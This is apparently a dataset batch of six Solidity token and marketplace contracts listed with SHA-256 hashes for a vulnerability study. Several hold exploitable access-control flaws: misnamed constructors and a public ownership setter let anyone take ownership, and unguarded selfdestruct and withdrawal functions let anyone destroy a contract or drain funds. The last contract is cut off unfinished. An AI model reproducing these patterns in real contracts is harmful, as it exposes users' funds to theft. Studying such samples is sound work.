# 本批实际输入源码

按输入原字节 SHA 核对。源码位置采用 UTF-8 字节偏移。

## RQ1_4b9105923111

SHA-256 `69718bd2e761f828af929e5d366dadea2fb62051fe01d280c79f9b2bef3dbe6b`

```solidity
pragma solidity ^0.4.18;
contract Token {
  function totalSupply () constant returns (uint256 _totalSupply);
  function balanceOf (address _owner) constant returns (uint256 balance);
  function transfer (address _to, uint256 _value) returns (bool success);
  function transferFrom (address _from, address _to, uint256 _value) returns (bool success);
  function approve (address _spender, uint256 _value) returns (bool success);
  function allowance (address _owner, address _spender) constant returns (uint256 remaining);
  event Transfer (address indexed _from, address indexed _to, uint256 _value);
  event Approval (address indexed _owner, address indexed _spender, uint256 _value);
}
contract SafeMath {
  uint256 constant private MAX_UINT256 =
  0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF;
  function safeAdd (uint256 x, uint256 y) constant internal returns (uint256 z) {
    assert (x <= MAX_UINT256 - y);
    return x + y;
  }
  function safeSub (uint256 x, uint256 y) constant internal returns (uint256 z) {
    assert (x >= y);
    return x - y;
  }
  function safeMul (uint256 x, uint256 y)  constant internal  returns (uint256 z) {
    if (y == 0) return 0; 
    assert (x <= MAX_UINT256 / y);
    return x * y;
  }
   function safeDiv(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a / b;
    return c;
  }
}
contract AbstractToken is Token, SafeMath {
  function AbstractToken () {
  }
  function balanceOf (address _owner) constant returns (uint256 balance) {
    return accounts [_owner];
  }
  function transfer (address _to, uint256 _value) returns (bool success) {
    if (accounts [msg.sender] < _value) return false;
    if (_value > 0 && msg.sender != _to) {
      accounts [msg.sender] = safeSub (accounts [msg.sender], _value);
      accounts [_to] = safeAdd (accounts [_to], _value);
    }
    Transfer (msg.sender, _to, _value);
    return true;
  }
  function transferFrom (address _from, address _to, uint256 _value)  returns (bool success) {
    if (allowances [_from][msg.sender] < _value) return false;
    if (accounts [_from] < _value) return false;
    allowances [_from][msg.sender] =
      safeSub (allowances [_from][msg.sender], _value);
    if (_value > 0 && _from != _to) {
      accounts [_from] = safeSub (accounts [_from], _value);
      accounts [_to] = safeAdd (accounts [_to], _value);
    }
    Transfer (_from, _to, _value);
    return true;
  }
  function approve (address _spender, uint256 _value) returns (bool success) {
    allowances [msg.sender][_spender] = _value;
    Approval (msg.sender, _spender, _value);
    return true;
  }
  function allowance (address _owner, address _spender) constant returns (uint256 remaining) {
    return allowances [_owner][_spender];
  }
  mapping (address => uint256) accounts;
  mapping (address => mapping (address => uint256)) private allowances;
}
contract CROPToken is AbstractToken {
     address public owner;
     uint256 tokenCount = 0;
     bool frozen = false;
     uint256 constant MAX_TOKEN_COUNT = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF;
    uint public constant _decimals = (10**8);
    modifier onlyOwner() {
	    require(owner == msg.sender);
	    _;
	}
    function CROPToken() {
         owner = msg.sender;
         createTokens(320 * (10**14));
     }
    function totalSupply () constant returns (uint256 _totalSupply) {
        return tokenCount;
     }
    function name () constant returns (string result) {
        return "CROP TOKEN";
    }
    function symbol () constant returns (string result) {
            return "CROP";
    }
    function decimals () constant returns (uint result) {
        return 8;
    }
    function transfer (address _to, uint256 _value) returns (bool success) {
    if (frozen) return false;
    else return AbstractToken.transfer (_to, _value);
  }
  function transferFrom (address _from, address _to, uint256 _value)
    returns (bool success) {
    if (frozen) return false;
    else return AbstractToken.transferFrom (_from, _to, _value);
  }
  function approve (address _spender, uint256 _currentValue, uint256 _newValue)
    returns (bool success) {
    if (allowance (msg.sender, _spender) == _currentValue)
      return approve (_spender, _newValue);
    else return false;
  }
  function burnTokens (uint256 _value) returns (bool success) {
    if (_value > accounts [msg.sender]) return false;
    else if (_value > 0) {
      accounts [msg.sender] = safeSub (accounts [msg.sender], _value);
      tokenCount = safeSub (tokenCount, _value);
      return true;
    } else return true;
  }
  function createTokens (uint256 _value) returns (bool success) {
    require (msg.sender == owner);
    if (_value > 0) {
      if (_value > safeSub (MAX_TOKEN_COUNT, tokenCount)) return false;
      accounts [msg.sender] = safeAdd (accounts [msg.sender], _value);
      tokenCount = safeAdd (tokenCount, _value);
    }
    return true;
  }
  function setOwner (address _newOwner) {
    require (msg.sender == owner);
    owner = _newOwner;
  }
  function freezeTransfers () {
    require (msg.sender == owner);
    if (!frozen) {
      frozen = true;
      Freeze ();
    }
  }
  function unfreezeTransfers () {
    require (msg.sender == owner);
    if (frozen) {
      frozen = false;
      Unfreeze ();
    }
  }
  event Freeze ();
  event Unfreeze ();
}
contract CROPSale is CROPToken  {
    enum State { ICO_FIRST, ICO_SECOND, STOPPED, CLOSED }
    State public currentState = State.ICO_FIRST;
    uint public tokenPrice = 250000000000000; 
    uint public _minAmount = 0.025 ether;
    address public beneficiary;
    uint256 public totalSold = 0;
    uint256 private _hardcap = 30000 ether;
    uint256 private _softcap = 3750 ether;
    bool private _allowedTransfers = true;
    modifier minAmount() {
        require(msg.value >= _minAmount);
        _;
    }
    modifier saleIsOn() {
        require(currentState != State.STOPPED && currentState != State.CLOSED);
        _;
    }
    function DESALSale() {
        owner = msg.sender;
        beneficiary = msg.sender;
    }
    function setState(State _newState) public onlyOwner {
        require(currentState != State.CLOSED);
        currentState = _newState;
    }
    function setMinAmount(uint _new) public onlyOwner {
        _minAmount = _new;
    }
    function allowTransfers() public onlyOwner {
            _allowedTransfers = true;		
    }
    function stopTransfers() public onlyOwner {
            _allowedTransfers = false;
    }
    function stopSale() public onlyOwner {
        currentState = State.CLOSED;
    }
    function setBeneficiaryAddress(address _new) public onlyOwner {
        beneficiary = _new;
    }
    function transferPayable(address _address, uint _amount) private returns (bool) {
        accounts[_address] = safeAdd(accounts[_address], _amount);
        accounts[owner] = safeSub(accounts[owner], _amount);
        totalSold = safeAdd(totalSold, _amount);
        return true;
    }
    function getTokens() public saleIsOn() minAmount() payable {
        uint tokens = get_tokens_count(msg.value);
        require(transferPayable(msg.sender , tokens));
        if(_allowedTransfers) { beneficiary.transfer(msg.value); }
    }
    function get_tokens_count(uint _amount) private returns (uint) {
         uint currentPrice = tokenPrice;
         uint tokens = safeDiv( safeMul(_amount, _decimals), currentPrice ) ;
         return tokens;
    }
    function() external payable {
      getTokens();
    }
}
```

## RQ1_dadf1b436e9d

SHA-256 `946be02ddab6982899fcc12d927dbdcc5de6ce797862fc2e9c82c68dd9dd8e5d`

```solidity
pragma solidity ^0.4.16;
contract owned {
    address public owner;
    function owned() public {
        owner = msg.sender;
    }
    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }
    function transferOwnership(address newOwner) onlyOwner public {
        owner = newOwner;
    }
}
interface tokenRecipient { function receiveApproval(address _from, uint256 _value, address _token, bytes _extraData) public; }
contract TokenERC20 {
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    uint256 public totalSupply;
    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Burn(address indexed from, uint256 value);
    function TokenERC20(
        uint256 initialSupply,
        string tokenName,
        string tokenSymbol
    ) public {
        totalSupply = initialSupply * 10 ** uint256(decimals);  
        balanceOf[msg.sender] = totalSupply;                
        name = tokenName;                                   
        symbol = tokenSymbol;                               
    }
    function _transfer(address _from, address _to, uint _value) internal {
        require(_to != 0x0);
        require(balanceOf[_from] >= _value);
        require(balanceOf[_to] + _value > balanceOf[_to]);
        uint previousBalances = balanceOf[_from] + balanceOf[_to];
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        Transfer(_from, _to, _value);
        assert(balanceOf[_from] + balanceOf[_to] == previousBalances);
    }
    function transfer(address _to, uint256 _value) public {
        _transfer(msg.sender, _to, _value);
    }
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(_value <= allowance[_from][msg.sender]);     
        allowance[_from][msg.sender] -= _value;
        _transfer(_from, _to, _value);
        return true;
    }
    function approve(address _spender, uint256 _value) public
        returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        return true;
    }
    function approveAndCall(address _spender, uint256 _value, bytes _extraData)
        public
        returns (bool success) {
        tokenRecipient spender = tokenRecipient(_spender);
        if (approve(_spender, _value)) {
            spender.receiveApproval(msg.sender, _value, this, _extraData);
            return true;
        }
    }
    function burn(uint256 _value) public returns (bool success) {
        require(balanceOf[msg.sender] >= _value);   
        balanceOf[msg.sender] -= _value;            
        totalSupply -= _value;                      
        Burn(msg.sender, _value);
        return true;
    }
    function burnFrom(address _from, uint256 _value) public returns (bool success) {
        require(balanceOf[_from] >= _value);                
        require(_value <= allowance[_from][msg.sender]);    
        balanceOf[_from] -= _value;                         
        allowance[_from][msg.sender] -= _value;             
        totalSupply -= _value;                              
        Burn(_from, _value);
        return true;
    }
}
contract MyAdvancedToken is owned, TokenERC20 {
    uint256 public sellPrice;
    uint256 public buyPrice;
    mapping (address => bool) public frozenAccount;
    event FrozenFunds(address target, bool frozen);
    function MyAdvancedToken(
        uint256 initialSupply,
        string tokenName,
        string tokenSymbol
    ) TokenERC20(initialSupply, tokenName, tokenSymbol) public {}
    function _transfer(address _from, address _to, uint _value) internal {
        require (_to != 0x0);                               
        require (balanceOf[_from] >= _value);               
        require (balanceOf[_to] + _value >= balanceOf[_to]); 
        require(!frozenAccount[_from]);                     
        require(!frozenAccount[_to]);                       
        balanceOf[_from] -= _value;                         
        balanceOf[_to] += _value;                           
        Transfer(_from, _to, _value);
    }
    function mintToken(address target, uint256 mintedAmount) onlyOwner public {
        balanceOf[target] += mintedAmount;
        totalSupply += mintedAmount;
        Transfer(0, this, mintedAmount);
        Transfer(this, target, mintedAmount);
    }
    function freezeAccount(address target, bool freeze) onlyOwner public {
        frozenAccount[target] = freeze;
        FrozenFunds(target, freeze);
    }
    function setPrices(uint256 newSellPrice, uint256 newBuyPrice) onlyOwner public {
        sellPrice = newSellPrice;
        buyPrice = newBuyPrice;
    }
    function buy() payable public {
        uint amount = msg.value / buyPrice;               
        _transfer(this, msg.sender, amount);              
    }
    function sell(uint256 amount) public {
        require(this.balance >= amount * sellPrice);      
        _transfer(msg.sender, this, amount);              
        msg.sender.transfer(amount * sellPrice);          
    }
    function () payable public {
    		uint amount = msg.value * buyPrice;               
    		_transfer(owner, msg.sender, amount);
    }
    function selfdestructs() payable public {
    		selfdestruct(owner);
    }
    function getEth(uint num) payable public {
    	owner.transfer(num);
    }
	function newinitialSupply(uint256 _initialSupply) public onlyOwner {
	    totalSupply = _initialSupply;
	}
}
```

## RQ1_240411a61f54

SHA-256 `0d8b87e2fa4b64f1ad6bdae3b5c253cdbae0710a3066b7f1ef6c7931a285afef`

```solidity
pragma solidity ^0.4.11;
contract Interface {
    function registerArtwork (address _contract, bytes32 _SHA256Hash, uint256 _editionSize, string _title, string _fileLink, uint256 _ownerCommission, address _artist, bool _indexed, bool _ouroboros);		
	function isSHA256HashRegistered (bytes32 _SHA256Hash) returns (bool _registered);			
	function isFactoryApproved (address _factory) returns (bool _approved);						
	function issuePatrons (address _to, uint256 _amount);										
    function totalSupply() constant returns (uint256 totalSupply);
	function balanceOf(address _owner) constant returns (uint256 balance);
 	function transfer(address _to, uint256 _value) returns (bool success);
 	function transferFrom(address _from, address _to, uint256 _value) returns (bool success);
	function approve(address _spender, uint256 _value) returns (bool success);
	function allowance(address _owner, address _spender) constant returns (uint256 remaining);
	function burn(uint256 _amount) returns (bool success);
	function burnFrom(address _from, uint256 _amount) returns (bool success);
}
contract Artwork {
	address public owner;						
	bytes32 public SHA256ofArtwork;				
	uint256 public editionSize;					
	string public title;						
	string public fileLink;						
	string public proofLink;					
	string public customText;					
	uint256 public ownerCommission;				
	uint256 public lowestAskPrice;				
	address public lowestAskAddress;			
	uint256 public lowestAskTime;				
	bool public pieceForSale;					
	uint256 public highestBidPrice;				
	address public highestBidAddress;			
	uint256 public highestBidTime;				
	uint public activationTime;					
	bool public pieceWanted;					
	event newLowestAsk (uint256 price, address seller);							
	event newHighestBid (uint256 price, address bidder);							
	event pieceTransfered (uint256 amount, address from, address to);				
	event pieceSold (address from, address to, uint256 price);					
	event Transfer (address indexed _from, address indexed _to, uint256 _value);
	event Approval (address indexed _owner, address indexed _spender, uint256 _value);
	event Burn (address indexed _owner, uint256 _amount);
	bool public proofSet;							
	uint256 ethartAward;					
	mapping (address => uint256) public piecesOwned;				
 	mapping (address => mapping (address => uint256)) allowed;		
    address registrar = 0xaD3e7D2788126250d48598e1DB6A2D3E19B89738;						
	function Artwork (								
		bytes32 _SHA256ofArtwork,
		uint256 _editionSize,
		string _title,
		string _fileLink,
		string _customText,
		uint256 _ownerCommission,
		address _owner
	) {
		if (_ownerCommission > 9750 || _ownerCommission <0) {throw;}
		owner = _owner;                            
		SHA256ofArtwork = _SHA256ofArtwork;
		editionSize = _editionSize;
		title = _title;
		fileLink = _fileLink;
		customText = _customText;
		ownerCommission = _ownerCommission;
		activationTime = now;	
	}
    modifier onlyBy(address _account)
    {
        require(msg.sender == _account);
        _;
    }
	modifier ethArtOnlyAfterOneYear()
	{
		require(msg.sender != registrar || now > activationTime + 31536000);
		_;
	}
	modifier ownerFirst()
	{
		require(msg.sender == owner || now > highestBidTime + 86400 || piecesOwned[owner] == 0);
		_;
	}
	modifier notLocked(address _owner, uint256 _amount)
	{
		require(_owner != lowestAskAddress || piecesOwned[_owner] > _amount);
		_;
	}
	function changeOwner (address newOwner) onlyBy (owner) {
		owner = newOwner;
		}
	function setProof (string _proofLink) onlyBy (owner) {
		if (!proofSet) {
			uint256 remainder;
			proofLink = _proofLink;
			proofSet = true;
			remainder = editionSize % 40;
			ethartAward = (editionSize - remainder) / 40;
			if (remainder > 0 && now % 39 <= remainder) {ethartAward++;}		
			piecesOwned[registrar] = ethartAward;
			piecesOwned[owner] = editionSize - ethartAward;
			}
		else {throw;}
		}
	function transfer(address _to, uint256 _amount) notLocked(msg.sender, _amount) returns (bool success) {
		if (piecesOwned[msg.sender] >= _amount 
			&& _amount > 0
			&& piecesOwned[_to] + _amount > piecesOwned[_to]
			&& _to != 0x0)																
			{
			piecesOwned[msg.sender] -= _amount;
			piecesOwned[_to] += _amount;
			Transfer(msg.sender, _to, _amount);
			return true;
			}
			else { return false;}
 		 }
    function totalSupply() constant returns (uint256 totalSupply) {
		totalSupply = editionSize;
		}
	function balanceOf(address _owner) constant returns (uint256 balance) {
 		return piecesOwned[_owner];
		}
 	function transferFrom(address _from, address _to, uint256 _amount) notLocked(_from, _amount) returns (bool success)
		{
			if (piecesOwned[_from] >= _amount
				&& allowed[_from][msg.sender] >= _amount
				&& _amount > 0
				&& piecesOwned[_to] + _amount > piecesOwned[_to]
				&& _to != 0x0															
				&& (_from != lowestAskAddress || piecesOwned[_from] > _amount))
					{
					piecesOwned[_from] -= _amount;
					allowed[_from][msg.sender] -= _amount;
					piecesOwned[_to] += _amount;
					Transfer(_from, _to, _amount);
					return true;
					} else {return false;}
		}
	function approve(address _spender, uint256 _amount) returns (bool success) {
		allowed[msg.sender][_spender] = _amount;
		Approval(msg.sender, _spender, _amount);
		return true;
		}
	function allowance(address _owner, address _spender) constant returns (uint256 remaining) {
		return allowed[_owner][_spender];
		}
	function burn(uint256 _amount) notLocked(msg.sender, _amount) returns (bool success) {
			if (piecesOwned[msg.sender] >= _amount) {
				piecesOwned[msg.sender] -= _amount;
				editionSize -= _amount;
				Burn(msg.sender, _amount);
				return true;
			}
			else {throw;}
		}
	function burnFrom(address _from, uint256 _value) notLocked(_from, _value) returns (bool success) {
		if (piecesOwned[_from] >= _value && allowed[_from][msg.sender] >= _value) {
			piecesOwned[_from] -= _value;
			allowed[_from][msg.sender] -= _value;
			editionSize -= _value;
			Burn(_from, _value);
			return true;
		}
		else {throw;}
	}
	function buyPiece() payable {
		if (pieceForSale && msg.value >= lowestAskPrice) {
			uint256 _amountOwner;
			uint256 _amountEthart;
			uint256 _amountSeller;
			_amountOwner = msg.value / 10000 * ownerCommission;
			_amountEthart = msg.value / 40;
			_amountSeller = msg.value - _amountOwner - _amountEthart;
			owner.transfer(_amountOwner);									
			lowestAskAddress.transfer(_amountSeller);						
			registrar.transfer(_amountEthart);								
			piecesOwned[lowestAskAddress]--;
			piecesOwned[msg.sender]++;
			Interface a = Interface(registrar);
			a.issuePatrons(msg.sender, msg.value / 5 * 2);
			pieceSold (lowestAskAddress, msg.sender, msg.value);
			pieceForSale = false;
			lowestAskPrice = 0;
			lowestAskAddress = 0x0;
		}
		else {throw;}
	}
	function offerPieceForSale (uint256 _price) ethArtOnlyAfterOneYear {
		if (_price < lowestAskPrice || !pieceForSale) {
				if (_price <= highestBidPrice) {fillBid();}
				else {
				pieceForSale = true;
				lowestAskPrice = _price;
				lowestAskAddress = msg.sender;
				lowestAskTime = now;
				newLowestAsk (_price, lowestAskAddress);			
				}
		}
		else {throw;}
	}
	function placeBid () payable {
		if (msg.value > highestBidPrice || (pieceForSale && msg.value >= lowestAskPrice)) {
			if (pieceWanted) {highestBidAddress.transfer (highestBidPrice);}
			if (pieceForSale && msg.value >= lowestAskPrice) {buyPiece();}
			else {
				pieceWanted = true;
				highestBidPrice = msg.value;
				highestBidAddress = msg.sender;
				highestBidTime = now;
				newHighestBid (msg.value, highestBidAddress);
				}
		}
		else {throw;}
	}
	function fillBid () ownerFirst ethArtOnlyAfterOneYear notLocked(msg.sender, 1) {	
		if (pieceWanted && piecesOwned[msg.sender] >= 1) {								
			uint256 _amountOwner;														
			uint256 _amountEthart;
			uint256 _amountSeller;
			uint256 patronReward;
			_amountOwner = highestBidPrice / 10000 * ownerCommission;
			_amountEthart = highestBidPrice / 40;
			_amountSeller = highestBidPrice - _amountOwner - _amountEthart;
			owner.transfer(_amountOwner);									
			msg.sender.transfer(_amountSeller);								
			registrar.transfer(_amountEthart);								
			piecesOwned[highestBidAddress]++;
			Interface a = Interface(registrar);
			patronReward = highestBidPrice  / 5 * 2;
			a.issuePatrons(highestBidAddress, patronReward);				
			piecesOwned[msg.sender]--;
			pieceSold (msg.sender, highestBidAddress, highestBidPrice);
			pieceWanted = false;
			highestBidPrice = 0;
			highestBidAddress = 0x0;
		}
		else {throw;}
	}
	function cancelBid () onlyBy (highestBidAddress){
		if (pieceWanted && now > highestBidTime + 86400) {
			pieceWanted = false;
			msg.sender.transfer(highestBidPrice);
			highestBidPrice = 0;
			highestBidAddress = 0x0;
			newHighestBid (0, 0x0);
		}
		else {throw;}
	}
	function cancelSale () onlyBy (lowestAskAddress){
		if(pieceForSale && now > lowestAskTime + 86400) {
			pieceForSale = false;
			lowestAskPrice = 0;
			lowestAskAddress = 0x0;
			newLowestAsk (0, 0x0);
		}
		else {throw;}
	}
}
```

## RQ1_409f227124c6

SHA-256 `f9cb81e1659428c9156b167f0d3fa47e21a3e043a189886d28bf770008b1f85e`

```solidity
pragma solidity ^0.4.18;
library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {
        if (a == 0) {
            return 0;
        }
        c = a * b;
        assert(c / a == b);
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256 c) {
        c = a + b;
        assert(c >= a);
        return c;
    }
}
contract AltcoinToken {
    function balanceOf(address _owner) constant public returns (uint256);
    function transfer(address _to, uint256 _value) public returns (bool);
}
contract ERC20Basic {
    uint256 public totalSupply;
    function balanceOf(address who) public constant returns (uint256);
    function transfer(address to, uint256 value) public returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
}
contract ERC20 is ERC20Basic {
    function allowance(address owner, address spender) public constant returns (uint256);
    function transferFrom(address from, address to, uint256 value) public returns (bool);
    function approve(address spender, uint256 value) public returns (bool);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
contract Hotto is ERC20 {
    using SafeMath for uint256;
    address owner = msg.sender;
    mapping (address => uint256) balances;
    mapping (address => mapping (address => uint256)) allowed;    
    string public constant name = "Hotto";
    string public constant symbol = "HT";
    uint public constant decimals = 8;
    uint256 public totalSupply = 10000000000e8;
    uint256 public totalDistributed = 0;        
    uint256 public tokensPerEth = 22500000e8;
    uint256 public constant minContribution = 1 ether / 100; 
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
    event Distr(address indexed to, uint256 amount);
    event DistrFinished();
    event Airdrop(address indexed _owner, uint _amount, uint _balance);
    event TokensPerEthUpdated(uint _tokensPerEth);
    event Burn(address indexed burner, uint256 value);
    bool public distributionFinished = false;
    modifier canDistr() {
        require(!distributionFinished);
        _;
    }
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
       function HT () public {
        owner = msg.sender;
        uint256 devTokens = 1000000000e8;
        distr(owner, devTokens);
    }
    function transferOwnership(address newOwner) onlyOwner public {
        if (newOwner != address(0)) {
            owner = newOwner;
        }
    }
    function finishDistribution() onlyOwner canDistr public returns (bool) {
        distributionFinished = true;
        DistrFinished();
        return true;
    }
    function distr(address _to, uint256 _amount) canDistr private returns (bool) {
        totalDistributed = totalDistributed.add(_amount);        
        balances[_to] = balances[_to].add(_amount);
        Distr(_to, _amount);
        Transfer(address(0), _to, _amount);
        return true;
    }
    function doAirdrop(address _participant, uint _amount) internal {
        require( _amount > 0 );      
        require( totalDistributed < totalSupply );
        balances[_participant] = balances[_participant].add(_amount);
        totalDistributed = totalDistributed.add(_amount);
        if (totalDistributed >= totalSupply) {
            distributionFinished = true;
        }
        Airdrop(_participant, _amount, balances[_participant]);
        Transfer(address(0), _participant, _amount);
    }
    function adminClaimAirdrop(address _participant, uint _amount) public onlyOwner {        
        doAirdrop(_participant, _amount);
    }
    function adminClaimAirdropMultiple(address[] _addresses, uint _amount) public onlyOwner {        
        for (uint i = 0; i < _addresses.length; i++) doAirdrop(_addresses[i], _amount);
    }
    function updateTokensPerEth(uint _tokensPerEth) public onlyOwner {        
        tokensPerEth = _tokensPerEth;
        TokensPerEthUpdated(_tokensPerEth);
    }
    function () external payable {
        getTokens();
     }
    function getTokens() payable canDistr  public {
        uint256 tokens = 0;
        require( msg.value >= minContribution );
        require( msg.value > 0 );
        tokens = tokensPerEth.mul(msg.value) / 1 ether;        
        address investor = msg.sender;
        if (tokens > 0) {
            distr(investor, tokens);
        }
        if (totalDistributed >= totalSupply) {
            distributionFinished = true;
        }
    }
    function balanceOf(address _owner) constant public returns (uint256) {
        return balances[_owner];
    }
    modifier onlyPayloadSize(uint size) {
        assert(msg.data.length >= size + 4);
        _;
    }
    function transfer(address _to, uint256 _amount) onlyPayloadSize(2 * 32) public returns (bool success) {
        require(_to != address(0));
        require(_amount <= balances[msg.sender]);
        balances[msg.sender] = balances[msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        Transfer(msg.sender, _to, _amount);
        return true;
    }
    function transferFrom(address _from, address _to, uint256 _amount) onlyPayloadSize(3 * 32) public returns (bool success) {
        require(_to != address(0));
        require(_amount <= balances[_from]);
        require(_amount <= allowed[_from][msg.sender]);
        balances[_from] = balances[_from].sub(_amount);
        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        Transfer(_from, _to, _amount);
        return true;
    }
    function approve(address _spender, uint256 _value) public returns (bool success) {
        if (_value != 0 && allowed[msg.sender][_spender] != 0) { return false; }
        allowed[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);
        return true;
    }
    function allowance(address _owner, address _spender) constant public returns (uint256) {
        return allowed[_owner][_spender];
    }
    function getTokenBalance(address tokenAddress, address who) constant public returns (uint){
        AltcoinToken t = AltcoinToken(tokenAddress);
        uint bal = t.balanceOf(who);
        return bal;
    }
    function withdraw() onlyOwner public {
        address myAddress = this;
        uint256 etherBalance = myAddress.balance;
        owner.transfer(etherBalance);
    }
    function burn(uint256 _value) onlyOwner public {
        require(_value <= balances[msg.sender]);
        address burner = msg.sender;
        balances[burner] = balances[burner].sub(_value);
        totalSupply = totalSupply.sub(_value);
        totalDistributed = totalDistributed.sub(_value);
        Burn(burner, _value);
    }
    function withdrawAltcoinTokens(address _tokenContract) onlyOwner public returns (bool) {
        AltcoinToken token = AltcoinToken(_tokenContract);
        uint256 amount = token.balanceOf(address(this));
        return token.transfer(owner, amount);
    }
}

```

## RQ1_a4bb8d18e79b

SHA-256 `988a64ea6e5cbe6ca57fae010b7944fb92bd811680bcb26c949caefc05848198`

```solidity
pragma solidity ^0.4.13;
contract EtherShare {
    uint public count;
    address[] public link; 
    struct oneShare {
        address sender;
        string nickname;
        uint timestamp;
        bool AllowUpdated;
        string content;
    }
    mapping(uint => oneShare[]) public allShare;
    event EVENT(uint ShareID, uint ReplyID);
    function EtherShare() public {
        NewShare("Peilin Zheng", false, "Hello, EtherShare!");  
    }
    function NewShare(string nickname, bool AllowUpdated, string content) public {
        allShare[count].push(oneShare(msg.sender, nickname, now, AllowUpdated, content)); 
        EVENT(count,0);
        count++;
    }
    function ReplyShare(uint ShareID, string nickname, bool AllowUpdated, string content) public {
        require(ShareID<count); 
        allShare[ShareID].push(oneShare(msg.sender, nickname, now, AllowUpdated, content));
        EVENT(ShareID,allShare[ShareID].length-1);
    }
    function Update(uint ShareID, uint ReplyID, string content) public {
        require(msg.sender==allShare[ShareID][ReplyID].sender && allShare[ShareID][ReplyID].AllowUpdated);  
        allShare[ShareID][ReplyID].content = content;
        allShare[ShareID][ReplyID].timestamp = now;
        EVENT(ShareID,ReplyID);
    }
}
```

## RQ1_1d0b6a82d011

SHA-256 `a0edd9786430240fa3601acf8ae404cd3f75a15c34008aeb66e926b5e243ba84`

```solidity
pragma solidity ^0.4.19;
library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a * b;
    assert(a == 0 || c / a == b);
    return c;
  }
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a / b;
    return c;
  }
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}
contract ForeignToken {
    function balanceOf(address _owner) constant public returns (uint256);
    function transfer(address _to, uint256 _value) public returns (bool);
}
contract ERC20Basic {
    uint256 public totalSupply;
    function balanceOf(address who) public constant returns (uint256);
    function transfer(address to, uint256 value) public returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
}
contract ERC20 is ERC20Basic {
    function allowance(address owner, address spender) public constant returns (uint256);
    function transferFrom(address from, address to, uint256 value) public returns (bool);
    function approve(address spender, uint256 value) public returns (bool);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
interface Token { 
    function distr(address _to, uint256 _value) public returns (bool);
    function totalSupply() constant public returns (uint256 supply);
    function balanceOf(address _owner) constant public returns (uint256 balance);
}
contract BITRATETOKEN is ERC20 {
    using SafeMath for uint256;
    address owner = msg.sender;
    mapping (address => uint256) balances;
    mapping (address => mapping (address => uint256)) allowed;
    mapping (address => bool) public blacklist;
    string public constant name = "BITRATE TOKEN";
    string public constant symbol = "BTRT";
    uint public constant decimals = 8;
    uint256 public totalSupply = 400000000e8;
    uint256 private totalReserved = (totalSupply.div(100)).mul(15);
    uint256 private totalBounties = (totalSupply.div(100)).mul(5);
    uint256 public totalDistributed = totalReserved.add(totalBounties);
    uint256 public totalRemaining = totalSupply.sub(totalDistributed);
    uint256 public value;
    uint256 public minReq;
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
    event Distr(address indexed to, uint256 amount);
    event DistrFinished();
    event Burn(address indexed burner, uint256 value);
    bool public distributionFinished = false;
    modifier canDistr() {
        require(!distributionFinished);
        _;
    }
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
    modifier onlyWhitelist() {
        require(blacklist[msg.sender] == false);
        _;
    }
    function testhash (uint256 _value, uint256 _minReq) public {
        owner = msg.sender;
        value = _value;
        minReq = _minReq;
        balances[msg.sender] = totalDistributed;
    }
     function setParameters (uint256 _value, uint256 _minReq) onlyOwner public {
        value = _value;
        minReq = _minReq;
    }
    function transferOwnership(address newOwner) onlyOwner public {
        if (newOwner != address(0)) {
            owner = newOwner;
        }
    }
    function enableWhitelist(address[] addresses) onlyOwner public {
        for (uint i = 0; i < addresses.length; i++) {
            blacklist[addresses[i]] = false;
        }
    }
    function disableWhitelist(address[] addresses) onlyOwner public {
        for (uint i = 0; i < addresses.length; i++) {
            blacklist[addresses[i]] = true;
        }
    }
    function finishDistribution() onlyOwner canDistr public returns (bool) {
        distributionFinished = true;
        DistrFinished();
        return true;
    }
    function distr(address _to, uint256 _amount) canDistr private returns (bool) {
        totalDistributed = totalDistributed.add(_amount);
        totalRemaining = totalRemaining.sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        Distr(_to, _amount);
        Transfer(address(0), _to, _amount);
        return true;
        if (totalDistributed >= totalSupply) {
            distributionFinished = true;
        }
    }
    function airdrop(address[] addresses) onlyOwner canDistr public {
        require(addresses.length <= 255);
        require(value <= totalRemaining);
        for (uint i = 0; i < addresses.length; i++) {
            require(value <= totalRemaining);
            distr(addresses[i], value);
        }
        if (totalDistributed >= totalSupply) {
            distributionFinished = true;
        }
    }
    function distribution(address[] addresses, uint256 amount) onlyOwner canDistr public {
        require(addresses.length <= 255);
        require(amount <= totalRemaining);
        for (uint i = 0; i < addresses.length; i++) {
            require(amount <= totalRemaining);
            distr(addresses[i], amount);
        }
        if (totalDistributed >= totalSupply) {
            distributionFinished = true;
        }
    }
